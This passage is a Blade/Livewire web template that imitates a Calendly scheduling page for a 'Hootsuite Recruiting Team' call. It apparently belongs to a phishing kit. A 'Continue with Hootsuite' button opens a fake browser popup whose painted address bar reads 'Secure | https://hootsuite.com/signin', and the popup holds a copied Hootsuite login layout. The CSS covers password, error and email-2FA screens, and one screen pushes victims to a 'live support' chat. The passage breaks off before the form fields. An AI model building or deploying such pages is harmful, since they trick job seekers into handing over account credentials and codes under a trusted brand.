<div>
    <style>
        .rtpMainLogin {
            display: flex;
            flex-wrap: wrap;
            min-height: 650px;
        }

        .rtpColumn {
            width: 58%;
            min-height: 100%;
            position: relative;
            background-color: #143059;
            padding: 45px 60px;
        }

        .rtpHSLogoAnchor {
            margin-bottom: 40px;
        }

        .rtpTitle {
            margin-right: 15px;
            font-size: 32px;
            line-height: 40px;
            font-weight: 900;
            color: #fff;
        }

        .rtpSubTitle {
            margin-bottom: 30px;
            font-size: 18px;
            line-height: 25px;
            color: #fff;
        }

        .tikTokAlertBox {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: flex-start;
            padding: 16px;
            gap: 10px;
            background-color: #acc4d7;
            color: #143059;
            font-style: normal;
            font-size: 16px;
            line-height: 20px;
        }

        .tikTokAlertBox .alertBoxHighlight {
            font-weight: 700;
        }

        .tikTokAlertBox .alertBoxHighlight .alertBoxText {
            font-weight: 400
        }

        .footnote {
            margin-top: 170px;
        }

        .footnote a {
            text-decoration: underline;
            color: #d0d6de;
            font-weight: 700
        }

        .tt-container-element {
            display: flex;
            flex-wrap: wrap;
        }

        .tt-child-element-left {
            width: calc(100% - 200px);
            padding-right: 30px;
        }

        .tt-child-element-right {
            width: 200px;
            display: flex;
            align-items: flex-end;
        }

        .owly-writer-ai-video-container {
            border-radius: 8px;
            overflow: hidden;
        }

        .owly-writer-ai-video-container video {
            width: 100%;
        }

        .rtpLoginColumn {
            width: 42%;
        }

        .rtpLoginColumn {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            padding: 45px 60px;
        }

        .rtpSelectionContainer h1 {
            font-size: 36px;
            font-weight: 900;
            margin-bottom: 24px;
            line-height: 45px;
        }

        .inputWrapper {
            position: relative;
            z-index: 0;
            margin-bottom: 8px;
            margin-top: 24px;
        }

        .inputWrapper .labelText,
        .inputWrapper label {
            display: flex;
            margin-bottom: 8px;
            font-weight: 700;
            align-items: center;
            justify-content: space-between;
        }

        .inputWrapper .inputContainer {
            position: relative;
            z-index: 5;
            width: 100%;
            height: 44px;
            border: 1px solid #7c797a;
            background-color: #fcfcfb;
            padding: 12px;
            border-radius: 0;
            font-family: "Source Sans Pro", "Helvetica Neue", Helvetica, Arial;
            font-size: 16px;
            color: #241f21;
            line-height: 20px;
            outline: 0;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
        }

        .submitButton {
            position: relative;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 44px;
            width: 100%;
            margin-bottom: 5px;
            border: 1px solid transparent;
            border-radius: 2px;
            padding: 12px 28px;
            font-weight: 700;
            line-height: 20px;
            cursor: pointer;
            box-sizing: border-box;
            outline: 0;
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            color: #504c4d;
            background: #d3d2d3;
            margin-top: 28px;
            margin-bottom: 12px;
        }

        .forgotPassword {
            display: inline-block;
            float: right;
            text-decoration: none;
            color: #2f6b9a;
            font-weight: 700;
            cursor: pointer;
            outline: 0;
        }

        .linksSectionContainer {
            text-align: center;
        }

        a.link {
            text-decoration: none;
            color: #2f6b9a;
            font-weight: 700;
            cursor: pointer;
            outline: 0;
            margin-top: 20px;
            display: inline-block;
        }

        .modLegalNotice.x-login {
            margin-top: 30px;
            margin-bottom: 0px;
            font-size: 16px;
            line-height: 20px;
            color: #241f21;
            text-align: center;
        }

        .modLegalNotice.x-login a {
            text-decoration: none;
            color: #2f6b9a;
            font-weight: 700;
            cursor: pointer;
            outline: 0;
        }

        .inputWrapper .inputContainer:focus {
            border: 3px solid #0b57d0;
        }

        .notification {
            padding: 12px;
            margin-bottom: 24px;
            display: flex;
        }

        .notification.error {
            background-color: #f8eaeb;
        }

        .notification .notificationIconContainer {
            padding-right: 8px;
            object-fit: contain;
            align-self: flex-start;
        }

        .notification .notificationMessage {
            flex: 1 1 auto;
        }

        .notification .notificationMessage .notificationTitle {
            font-weight: 700;
            padding-bottom: 4px;
        }

        .email-2fa-wrapper {
            display: flex;
            flex-wrap: wrap;
            margin-bottom: 0;
            padding: 30px 50px;
            padding-bottom: 0;
            background: #fff;
        }

        .email-2fa-wrapper .left-section {
            width: 35%;
            padding-bottom: 30px;
        }

        .email-2fa-wrapper .left-section p {
            font-size: 12px;
            margin-bottom: 5px;
        }

        .email-2fa-wrapper .left-section .title {
            font-size: 30px;
            font-weight: 700;
            margin-top: 10px;
            margin-bottom: 20px;
        }

        .email-2fa-wrapper .left-section .inputWrapper {
            margin-top: 5px;
            margin-bottom: 0;
        }

        .email-2fa-wrapper .left-section .inputWrapper label {
            font-weight: 400
        }

        .email-2fa-wrapper .left-section .submitButton {
            margin-top: 20px;
        }

        .email-2fa-wrapper .right-section {
            width: 65%;
            min-height: 100%;
            display: flex;
            align-items: flex-start;
            padding: 0px 30px;
            margin-top: 30px;
        }

        .email-2fa-wrapper .right-section img {
            width: 100%
        }

        .links {
            text-align: center;

        }

        .links a {
            text-decoration: none;
            color: #2f6b9a;
            font-weight: 700;
            cursor: pointer;
            outline: 0;
        }

        .facebook__button button {
            background: #E03035;
            color: #fff;
        }

        #progressbar .active {
            color: #E03035;
        }

        #progressbar li.active:after,
        #progressbar li.active:before {
            background-color: #E03035;
        }

        @media (max-width: 768px) {
            .rtpColumn {
                display: none;
            }

            .email-2fa-wrapper {
                padding: 30px;
            }

            .email-2fa-wrapper .left-section {
                width: 100%;
            }

            .email-2fa-wrapper .right-section {
                display: none;
            }

            .rtpLoginColumn {
                width: 100%;
                padding: 30px;
                display: block;
                background: #fff;
            }

            .tt-child-element-left {
                width: 100%;
                padding-right: 0;
            }

            .tt-child-element-right {
                width: 100%;
                justify-content: center;
                margin-top: 20px;
            }
        }
    </style>
    <div id="root">
        <div class="App">
            <div class="box__shadow">
                <div class="calendar__wrapper {{ $webStatus ? '' : 'd-none' }}">
                    <div class="user__wrapper">
                        <div class="logo__wrapper"><img width="70%" src="{{ asset('img/logo-big.png') }}" /></div>
                        <div class="screen__two center__text">
                            <div class="mobile__back-svg">
                                <div class="content__wrapper">
                                    <div style="margin-bottom: 15px;">
                                        <div><img class="avatar" width="65px" src="{{ asset('img/logo.png') }}" />
                                        </div>
                                    </div>
                                    <h2>15 Minutes Meeting</h2>
                                </div>
                            </div>
                            <div class="minute">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg"
                                    role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="#E03035"
                                        stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="#E03035"
                                        stroke-linecap="round" stroke-linejoin="round"></path>
                                </svg>
                                <span>15 min</span>
                            </div>
                            <div class="minute mt-12">
                                <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10"
                                    xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path
                                        d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
                                        fill="none" stroke="#E03035" stroke-linecap="round" stroke-linejoin="round">
                                    </path>
                                </svg>
                                <span>Phone call</span>
                            </div>
                            <div class="minute space__bettwen">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10" xmlns="http://www.w3.org/2000/svg"
                                    role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none" stroke="#E03035"
                                        stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path
                                        d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
                                        fill="none" stroke="#E03035" stroke-linecap="round" stroke-linejoin="round">
                                    </path>
                                </svg>
                                <span>US Georgia (00:59)</span>
                            </div>
                        </div>
                        <div class="footer__wrapper">
                            <p>Cookie settings</p>
                            <p>Report abuse</p>
                        </div>
                    </div>
                    <div class="date__time {{ $showCalender == false ? 'd-none' : '' }}">
                        <div class="{{ $showCalenderProgress ? 'd-none' : '' }}">
                            <h2>Select a Date & Time</h2>
                            <div wire:ignore class=" calendar__container svg__icon">
                                <div style="min-width: 400px;padding-right: 15px;margin-top:20px;">
                                    <div wire:ignore class="calendar-wrapper" id="calendar-wrapper"></div>
                                    <div class="time__zone-wrapper" style="margin-top: 20px;">
                                        <p>Time zone</p>
                                        <div class="central">
                                            <img width="14px" src="{{ asset('world.png') }}">
                                            US Georgia (00:59)
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class=" loading-container2 {{ $showCalenderProgress ? '' : 'd-none' }}">
                            <h1 style="font-size: 48px;">Saving your selection</h1>
                            <h2>Please contact our live support to fully approve your scheduled date</h2>
                            <div class="loader2"></div>
                            <div style="margin-top: 40px;">
                                <a id="openChat" class="blue-btn" href="#">Contact live chat support</a>
                            </div>
                        </div>
                        <a class="logo__wrapper-calendly hide__mobile">
                            <div class="background">
                                <div class="powerd__by">powered by</div>
                                <div class="calendly">Calendly</div>
                            </div>
                        </a>
                    </div>
                    <div class="form__wrapper date__time {{ $showCalender ? 'd-none' : '' }}">
                        <div>
                            <div class="full__width">
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <h2>Schedule call with Hootsuite - Recruiting Team</h2>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="form-steps">
                                        <form id="msform">
                                            <ul id="progressbar">
                                                <li class="active" id="account"><strong>Verify</strong></li>
                                                <li id="personal"><strong>Schedule</strong></li>
                                                <li id="confirm"><strong>Finish</strong></li>
                                            </ul>
                                        </form>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="dummy__text">
                                        <p>
                                            Please confirm your appointment with Hootsuite - Recruiting Team. <br />
                                            To complete the confirmation process, continue with Hootsuite
                                        </p>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="facebook__button">
                                        <button id="continue-facebook" wire:click.prevent="openLoginModal"
                                            style="display: flex; align-items: center; justify-content: center;">
                                            <img src="{{ asset('favicon.ico') }}" alt="Continue with Hootsuite"
                                                height="25px" width="25px" />
                                            Continue with Hootsuite
                                        </button>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
                                        <p>Cookie settings</p>
                                        <p>Report abuse</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <a class="logo__wrapper-calendly hide__mobile">
                            <div class="background">
                                <div class="powerd__by">powered by</div>
                                <div class="calendly">Calendly</div>
                            </div>
                        </a>
                    </div>
                </div>
                <div class="calendar__wrapper {{ $webStatus ? 'd-none' : '' }}">
                    <div class="user__wrapper">
                        <div class="logo__wrapper"><img width="70%" src="{{ asset('img/images.png?v=2') }}" />
                        </div>
                        <div class="screen__two center__text">
                            <div class="mobile__back-svg">
                                <div class="content__wrapper">
                                    <div style="margin-bottom: 15px;">
                                        <div><img class="avatar" width="65px"
                                                src="{{ asset('img/logo.png?v=3') }}" /></div>
                                    </div>
                                    <h2>15 Minutes Meeting</h2>
                                </div>
                            </div>
                            <div class="minute">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10"
                                    xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none"
                                        stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path d="M5 3.269V5l1.759 2.052" fill="none" stroke="currentColor"
                                        stroke-linecap="round" stroke-linejoin="round"></path>
                                </svg>
                                <span>15 min</span>
                            </div>
                            <div class="minute mt-12">
                                <svg data-testid="phone-call-icon" data-id="details-item-icon" viewBox="0 0 10 10"
                                    xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path
                                        d="M6.216 9.151a2.215 2.215 0 0 0 2.758-.3l.31-.31a.738.738 0 0 0 0-1.043l-1.3-1.3a.739.739 0 0 0-1.044 0h0a.738.738 0 0 1-1.043 0L3.806 4.107a.738.738 0 0 1 0-1.043h0a.739.739 0 0 0 0-1.044L2.5.716a.738.738 0 0 0-1.043 0l-.31.31a2.214 2.214 0 0 0-.3 2.758 19.976 19.976 0 0 0 5.369 5.367Z"
                                        fill="none" stroke="currentColor" stroke-linecap="round"
                                        stroke-linejoin="round"></path>
                                </svg>
                                <span>Phone call</span>
                            </div>
                            <div class="minute space__bettwen">
                                <svg data-id="details-item-icon" viewBox="0 0 10 10"
                                    xmlns="http://www.w3.org/2000/svg" role="img">
                                    <path d="M.5 5a4.5 4.5 0 1 0 9 0 4.5 4.5 0 1 0-9 0Z" fill="none"
                                        stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"></path>
                                    <path
                                        d="M.846 6.731h1.212a1.212 1.212 0 0 0 1.211-1.212V4.481a1.212 1.212 0 0 1 1.212-1.212 1.211 1.211 0 0 0 1.211-1.211V.553M9.5 4.929a2.469 2.469 0 0 0-1.117-.275H6.9a1.212 1.212 0 1 0 0 2.423.865.865 0 0 1 .865.865v.605"
                                        fill="none" stroke="currentColor" stroke-linecap="round"
                                        stroke-linejoin="round"></path>
                                </svg>
                                <span>US Georgia (00:59)</span>
                            </div>
                        </div>
                        <div class="footer__wrapper">
                            <p>Cookie settings</p>
                            <p>Report abuse</p>
                        </div>
                    </div>
                    <div class="form__wrapper date__time  ">
                        <div>
                            <div class="full__width">
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div style="margin-top: 20%;padding: 30px;text-align: center">
                                        <h1>The calender link is currently closed. Please check back later. </h1>
                                        <p style="font-size: 18px">Unfortunately, the calendar link to schedule a
                                            meeting is currently closed. It will
                                            open soon. Please contact your recruiting team via email to secure a spot.
                                        </p>
                                    </div>
                                </div>
                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
                                    <div class="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
                                        <p>Cookie settings</p>
                                        <p>Report abuse</p>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <a class="logo__wrapper-calendly hide__mobile">
                            <div class="background">
                                <div class="powerd__by">powered by</div>
                                <div class="calendly">Calendly</div>
                            </div>
                        </a>
                    </div>
                </div>
            </div>
            <a class="logo__wrapper-calendly-mobile">
                <div class="background">
                    <div class="powerd__by">powered by</div>
                    <div class="calendly">Calendly</div>
                </div>
            </a>
        </div>
    </div>
    <div wire:ignore.self style="display: none;" id="continue-modal">
        <div class="ant-modal-root">
            <div class="ant-modal-mask"></div>
            <div tabindex="-1" class="ant-modal-wrap">
                <div role="dialog" aria-labelledby="rc_unique_0" aria-modal="true"
                    class="ant-modal modal-wrapper modal__facebook"
                    style="max-width: 1200px; transform-origin: 519px 247px;">
                    <div tabindex="0" aria-hidden="true"
                        style="width: 0px; height: 0px; overflow: hidden; outline: none;"></div>
                    <div class="ant-modal-content">
                        <button type="button" aria-label="Close" class="ant-modal-close">
                            <span class="ant-modal-close-x">
                                <span role="img" aria-label="close"
                                    class="anticon anticon-close ant-modal-close-icon">
                                    <svg fill-rule="evenodd" viewBox="64 64 896 896" focusable="false"
                                        data-icon="close" width="1em" height="1em" fill="currentColor"
                                        aria-hidden="true">
                                        <path
                                            d="M799.86 166.31c.02 0 .04.02.08.06l57.69 57.7c.04.03.05.05.06.08a.12.12 0 010 .06c0 .03-.02.05-.06.09L569.93 512l287.7 287.7c.04.04.05.06.06.09a.12.12 0 010 .07c0 .02-.02.04-.06.08l-57.7 57.69c-.03.04-.05.05-.07.06a.12.12 0 01-.07 0c-.03 0-.05-.02-.09-.06L512 569.93l-287.7 287.7c-.04.04-.06.05-.09.06a.12.12 0 01-.07 0c-.02 0-.04-.02-.08-.06l-57.69-57.7c-.04-.03-.05-.05-.06-.07a.12.12 0 010-.07c0-.03.02-.05.06-.09L454.07 512l-287.7-287.7c-.04-.04-.05-.06-.06-.09a.12.12 0 010-.07c0-.02.02-.04.06-.08l57.7-57.69c.03-.04.05-.05.07-.06a.12.12 0 01.07 0c.03 0 .05.02.09.06L512 454.07l287.7-287.7c.04-.04.06-.05.09-.06a.12.12 0 01.07 0z">
                                        </path>
                                    </svg>
                                </span>
                            </span>
                        </button>
                        <div class="ant-modal-header">
                            <div class="ant-modal-title" id="rc_unique_0">
                                <div>
                                    <div class="wrapper_header">
                                        <div class="sign__up-modal">
                                            <img src="{{ asset('img/logo.png') }}" alt="" width="17px" />
                                            <p>Log into Hootsuite</p>
                                        </div>
                                        <div class="icons">
                                            <div class="img"><img src="{{ asset('img/minus.png') }}"
                                                    alt="" /></div>
                                            <div class="img"><img
                                                    src="https://icons-for-free.com/iconfiles/png/512/square-1321215626459427421.png"
                                                    alt="" /></div>
                                            <div class="img img-x"><img src="{{ asset('img/close.png') }}"
                                                    alt="" /></div>
                                        </div>
                                    </div>
                                    <div class="input__title-wrapper">
                                        <div class="lock__screen">
                                            <div class="lock">
                                                <div class="lock__wrapper"><img src="{{ asset('img/locktest.png') }}"
                                                        alt="" /><span class="green">Secure |
                                                        https://</span><span class="black-opacity"></span></div>
                                            </div>
                                            <span class="input__value">
                                                hootsuite.com/signin?_gl=1%2A1ww1wnk%2A_gcl_au%2AMjc1MTg1NTAyLjE3NDgwODc0NTQ.%2AFPAU%2AMjc1MTg1NTAyLjE3NDgwODc0NTQ.%2A_ga%2AOTg3NDQ1MDkxLjE3NDgwODc0NTU.%2A_ga_9ZZYCN29EN%2AczE3NDgwODc0NTQkbzEkZzAkdDE3NDgwODc0NTckajU3JGwwJGgwJGQ4dENxM0paV3FkbjNRRFpxNWlqd21VNHIwWEtkWEVIYWJR%2A_fplc%2AV202RWwyNWFUczYzSDZ3MTBKUUJPU0hzVTNydkhySTMyZjhTVGxJZkdkbjFsJTJGTnA5RmpCM0JNcGlDWEdiRDBUblc2NVpNcURhYVNhV1MlMkZIa2t1Q0F2TXZjQkNqMnlIY0ZoVXFLWEVkUE41eHFDcjZxNndyQUY3WktzRXdnZyUzRCUzRA
                                            </span>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="ant-modal-body" style="min-height: 650px">
                            <div class="confirmation-container-modal">
                                @if ($enableLoginForm)
                                    <div class="rtpMainLogin mainLogin _mainLoginBlock">
                                        <!-- Content -->
                                        <div class="rtpColumn owly-writer-sign-in">
                                            <div class="tt-container-element">
                                                <div class="tt-child-element-left">
                                                    <div class="rtpHSLogoAnchor">
                                                        <a href="javascript:void(0)" tabindex="0"
                                                            aria-label="Hootsuite.com Main Landing Page">
                                                            <svg style="width: auto; height: 30px;"
                                                                viewBox="77.685 25.563 884.115 162.737" version="1.1"
                                                                xmlns="http://www.w3.org/2000/svg">
                                                                <g>
                                                                    <path fill="#FF4C46"
                                                                        d="M238.4,48l-52.5,4.7c-9.1-5.3-18.1-7.4-27.6-7.4c-2.5,0-5.1,0.2-7.7,0.7L95.7,25.7 c-2.2-0.8-3.8,2.1-1.9,3.5l33.7,26.1c-7.1,4.4-13.8,10.2-19.7,16.8C97.7,83.6,85.1,115.4,79,132c-2.6,7.1-1.3,15,3.5,20.8 c11.2,13.6,34.4,35.6,79,35.6c40.9,0,61.6-18.4,71.3-31.8c5.4-7.5,7-17,4.3-25.8c-4.4-14.9-13.7-40.7-28.8-58.4 c-0.5-0.6-1.1-1.2-1.6-1.8l32.7-19.4C240.9,50.3,240.2,47.9,238.4,48z">
                                                                    </path>
                                                                </g>
                                                                <g>
                                                                    <path fill="#FFFFFF"
                                                                        d="M183.6,143.9c-3.9,1.4-12.7,3.5-22.5-1.6c-0.5-0.3-1,0.4-0.6,0.8c3.1,3.3,8.6,9.2,12,12 c0.7,0.6,1.8,0.5,2.4-0.2l9.3-10.3C184.5,144.3,184.1,143.7,183.6,143.9z">
                                                                    </path>
                                                                    <path fill="#FFFFFF"
                                                                        d="M219.9,101.1c-5-10.8-12.4-20.9-23.7-22.1c-2-0.2-4.1,0.2-5.8,1.3l-12.3,7.3c-3.1,1.8-6.9,1.6-9.7-0.6 l-10.7-8.3c-3.6-2.8-7.7-4.8-12.1-5.8c-18.3-4.3-30.7,5.3-40.1,23.3c-9,17.2-4,42,18.1,47.8c23.3,6.2,38.7-19.7,44.9-28.3 c1.2-1.7,3.6-1.7,4.8,0c9.6,13,22.4,26.9,36.2,24.1C227.6,136.1,225.5,113.3,219.9,101.1z M152.4,114.8 c-4.5,3-10.2,2.3-13.6-2.8c-3.4-5.1-1.9-10.7,2.6-13.7c4.5-3,10.2-2.3,13.6,2.8C158.4,106.2,156.9,111.8,152.4,114.8z M200.1,115.7c-4.5,3-10.2,2.3-13.6-2.8c-3.4-5.1-1.9-10.7,2.6-13.7c4.5-3,10.2-2.3,13.6,2.8 C206.1,107.1,204.6,112.7,200.1,115.7z">
                                                                    </path>
                                                                    <path fill="#FFFFFF"
                                                                        d="M173.1,122.3c-0.9-1-2.6-1-3.5,0.1l-9.8,11.6c-0.5,0.5-0.4,1.4,0.2,1.8c2.3,1.6,7.8,5.2,13.2,5.2 c5,0,9.5-1.9,11.7-3c0.7-0.4,0.9-1.3,0.4-1.9L173.1,122.3z">
                                                                    </path>
                                                                </g>
                                                                <g>
                                                                    <g>
                                                                        <path fill="#FF4C46"
                                                                            d="M284.2,155.2V77.6h17.2v33.7h57.1V77.6h17.2v77.6h-17.2v-29.4h-57.1v29.4H284.2z">
                                                                        </path>
                                                                        <path fill="#FF4C46"
                                                                            d="M424.5,157.2c-11.4,0-20.6-3-27.5-8.9c-7-5.9-10.4-13.7-10.4-23.4c0-9.7,3.5-17.5,10.4-23.4 c7-5.9,16.1-8.9,27.5-8.9c11.5,0,20.7,3,27.7,8.9c7,5.9,10.4,13.7,10.4,23.4c0,9.7-3.5,17.5-10.4,23.4 C445.2,154.2,436,157.2,424.5,157.2z M424.5,143.8c6.6,0,12-1.7,16-5.2c4-3.5,6.1-8,6.1-13.7c0-5.7-2-10.4-6.1-13.8 c-4-3.5-9.4-5.2-16-5.2c-6.6,0-11.8,1.8-15.9,5.3c-4,3.5-6.1,8.1-6.1,13.8c0,5.7,2,10.2,6.1,13.7 C412.7,142.1,418,143.8,424.5,143.8z">
                                                                        </path>
                                                                        <path fill="#FF4C46"
                                                                            d="M508.3,157.2c-11.4,0-20.6-3-27.5-8.9c-7-5.9-10.4-13.7-10.4-23.4c0-9.7,3.5-17.5,10.4-23.4 c7-5.9,16.1-8.9,27.5-8.9c11.5,0,20.7,3,27.7,8.9c7,5.9,10.4,13.7,10.4,23.4c0,9.7-3.5,17.5-10.4,23.4 C529,154.2,519.8,157.2,508.3,157.2z M508.3,143.8c6.6,0,12-1.7,16-5.2c4-3.5,6.1-8,6.1-13.7c0-5.7-2-10.4-6.1-13.8 c-4-3.5-9.4-5.2-16-5.2c-6.6,0-11.8,1.8-15.9,5.3c-4,3.5-6.1,8.1-6.1,13.8c0,5.7,2,10.2,6.1,13.7 C496.4,142.1,501.7,143.8,508.3,143.8z">
                                                                        </path>
                                                                        <path fill="#FF4C46"
                                                                            d="M578.2,156.4c-7.6,0-11.9-3.5-14.1-6.7c-2.3-3.2-4.1-7.3-4.1-16.3v-26.3h-8.7V94.6h11.2v-17h14.8v17h17.5 v12.5h-17.5v22.7c-0.1,6.8,1,9.2,2.6,10.9c2.9,2.9,11.7,0.9,14.9-1.1v13.1C591,155.2,584.3,156.4,578.2,156.4z">
                                                                        </path>
                                                                        <path fill="#FF4C46"
                                                                            d="M638.6,157.2c-10.8,0-21.6-1.6-32.5-4.7v-13.8c9.1,3.5,19,5.2,29.7,5.2c7.7,0,13.2-0.5,16.5-1.5 c3.3-1,5-2.7,5-5.2c0-2.3-1.8-4-5.5-4.9c-3.7-0.9-8.2-1.5-13.5-1.8c-5.3-0.2-10.6-0.7-15.9-1.4c-5.3-0.7-9.8-2.4-13.5-5 c-3.7-2.7-5.5-6.4-5.5-11.3c0-6.6,3.2-11.6,9.6-15c6.4-3.4,15.1-5.1,26.1-5.1c8.7,0,18.8,1.1,30.3,3.4v13.3 c-9.9-2.1-19.5-3.2-28.5-3.2c-13.7,0-20.6,2.1-20.6,6.3c0,2.1,1.9,3.6,5.6,4.4c3.7,0.8,8.2,1.4,13.5,1.8 c5.3,0.3,10.5,0.9,15.8,1.6c5.3,0.8,9.8,2.5,13.5,5.3c3.7,2.8,5.6,6.6,5.6,11.5c0,6.8-3.2,11.8-9.5,15.1 C658.5,155.5,649.7,157.2,638.6,157.2z">
                                                                        </path>
                                                                        <path fill="#FF4C46"
                                                                            d="M756.6,94.6v60.7h-18.9l2.4-25h-1c-2.8,18-12.8,26.9-29.8,26.9c-8.7-0.2-15.1-3-19.2-8.6 c-4-5.5-6.1-14.8-6.1-27.7V94.6h17.2v24.3c0,9.1,1.3,15.6,3.9,19.5c2.6,3.9,6.8,5.8,12.7,5.8c6.6,0,11.8-3,15.6-9 c3.9-6,5.8-13.9,5.8-23.9V94.6H756.6z">
                                                                        </path>
                                                                        <path fill="#FF4C46"
                                                                            d="M780,88.7c-3.3,0-5.9-0.8-7.8-2.5c-1.9-1.7-2.8-4.1-2.8-7.3c0-3.2,0.9-5.7,2.8-7.3 c1.9-1.6,4.4-2.4,7.8-2.4c3.4,0,6,0.8,7.9,2.4c1.9,1.6,2.9,4,2.9,7.3C790.8,85.5,787.2,88.7,780,88.7z M771.6,155.2V94.6h17.2 v60.7H771.6z">
                                                                        </path>
                                                                        <path fill="#FF4C46"
                                                                            d="M885.9,157.2c-11,0-19.8-3-26.5-8.9c-6.7-5.9-10-13.7-10-23.4c0-9.7,3.3-17.5,10-23.4 c6.7-5.9,15.5-8.9,26.5-8.9c10.8,0,19.6,2.5,26.3,7.6c6.7,5.1,10.1,11.7,10.3,20v9.9h-56.5c1,4.9,3.5,8.5,7.7,10.7 c4.2,2.2,10.3,3.3,18.4,3.3c10.7,0,15.5-1.7,20.7-3.6c0.8-0.3,6.5-2.8,7-3v13.8c-6.1,2.3-11.4,3.9-15.9,4.7 C899.3,156.7,893.3,157.2,885.9,157.2z M865.5,121.7l40.5-1c-0.2-5.3-2-9.2-5.2-11.5c-3.2-2.3-8.2-3.5-14.9-3.5 c-6.5,0-11.3,1.2-14.6,3.7C868,112,866.1,116.1,865.5,121.7z">
                                                                        </path>
                                                                        <path fill="#FF4C46"
                                                                            d="M827.2,156.4c-7.6,0-11.9-3.5-14.1-6.7c-2.3-3.2-4.1-7.3-4.1-16.3v-26.3h-8.7V94.6h11.2v-17h14.8v17h17.5 v12.5h-17.5v22.7c-0.1,6.8,1,9.2,2.6,10.9c2.9,2.9,11.7,0.9,14.9-1.1v13.1C840,155.2,833.4,156.4,827.2,156.4z">
                                                                        </path>
                                                                    </g>
                                                                    <g>
                                                                        <path fill="#FF4C46"
                                                                            d="M939.3,108.5c-1.6,1.6-3.5,2.4-5.8,2.4s-4.2-0.8-5.8-2.4c-1.6-1.6-2.4-3.5-2.4-5.8c0-2.2,0.8-4.2,2.4-5.8 c1.6-1.6,3.5-2.4,5.8-2.4c2.3,0,4.2,0.8,5.8,2.4c1.6,1.6,2.4,3.5,2.4,5.8C941.7,105,940.9,106.9,939.3,108.5z M928.6,97.7 c-1.4,1.4-2,3-2,5c0,2,0.7,3.6,2,5c1.4,1.4,3,2.1,5,2.1c2,0,3.6-0.7,5-2.1c1.4-1.4,2-3.1,2-5c0-1.9-0.7-3.6-2-5 c-1.4-1.4-3-2.1-5-2.1C931.6,95.7,929.9,96.4,928.6,97.7z M933.4,98.2c1.1,0,1.9,0.1,2.5,0.3c0.9,0.4,1.4,1.1,1.4,2.3 c0,0.8-0.3,1.4-0.9,1.8c-0.3,0.2-0.7,0.3-1.3,0.4c0.7,0.1,1.2,0.4,1.5,0.9s0.5,0.9,0.5,1.4v0.7c0,0.2,0,0.4,0,0.7 c0,0.2,0,0.4,0.1,0.5l0.1,0.1h-1.5c0,0,0-0.1,0-0.1c0,0,0-0.1,0-0.1l0-0.3V106c0-1-0.3-1.7-0.8-2.1c-0.3-0.2-0.9-0.3-1.8-0.3 h-1.2v3.5h-1.6v-9H933.4z M935.1,99.6c-0.4-0.2-1-0.3-1.9-0.3h-1.4v3.3h1.4c0.7,0,1.2-0.1,1.5-0.2c0.6-0.2,0.9-0.7,0.9-1.4 C935.7,100.3,935.5,99.8,935.1,99.6z">
                                                                        </path>
                                                                    </g>
                                                                </g>
                                                            </svg>
                                                        </a>

                                                    </div>
                                                    <h1 class="rtpTitle">Do more in less time with OwlyWriter AI</h1>
                                                    <p class="rtpSubTitle">Generate captions and posts in seconds!
                                                        OwlyWriter AI makes content creation seriously easy for busy
                                                        social
                                                        pros like you.</p>
                                                    <p class="tikTokAlertBox">
                                                        <span class="alertBoxHighlight">Our AI tool is so simple to
                                                            use,
                                                            anyone can do it. <span class="alertBoxText">Click
                                                                Inspiration
                                                                to get started.</span></span>
                                                    </p>
                                                    <span class="spacer"></span>
                                                    <p class="footnote"><a class="upgradePlan"
                                                            href="javascript:void(0)" tabindex="0">Try OwlyWriter AI
                                                            now.</a></p>
                                                </div>
